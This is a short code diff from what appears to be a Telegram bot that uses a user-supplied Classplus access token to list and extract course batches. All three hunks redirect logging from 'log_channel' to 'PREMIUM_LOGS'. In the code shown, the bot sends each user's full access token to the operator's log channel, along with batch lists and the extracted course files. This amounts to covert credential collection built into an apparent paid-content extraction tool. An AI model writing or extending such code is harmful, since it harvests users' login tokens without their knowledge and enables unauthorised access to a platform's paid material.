@@ -247,7 +247,7 @@ async def classplus_txt(app, message):
 
     elif len(user_input) > 20:
         a = f"CLASSPLUS LOGIN SUCCESSFUL FOR\n\n<blockquote>`{user_input}`</blockquote>"
-        await app.send_message(log_channel, a)
+        await app.send_message(PREMIUM_LOGS, a)
         headers = {
             'x-access-token': user_input,
             'user-agent': 'Mobile-Android',
@@ -306,7 +306,7 @@ async def fetch_batches(app, message, org_name):
             course_list.append((idx, course_id, course_name))
         
         mo = (f"<blockquote>{text}</blockquote>") 
-        await app.send_message(log_channel, mo)
+        await app.send_message(PREMIUM_LOGS, mo)
         selected_index = await app.ask(message.chat.id, f"<blockquote>{text}\nReply with the index number of the batch to extract.</blockquote>", timeout=180)
         
         
@@ -419,7 +419,7 @@ async def extract_batch(app, message, org_name, batch_id):
         c_text = f"App Name : {org_name}\n\nBATCH NAME : {batch_name}"
 
         await app.send_document(message.chat.id, file_path, caption=c_text)
-        await app.send_document(log_channel, file_path, caption=c_text)
+        await app.send_document(PREMIUM_LOGS, file_path, caption=c_text)
 
         os.remove(file_path)
             
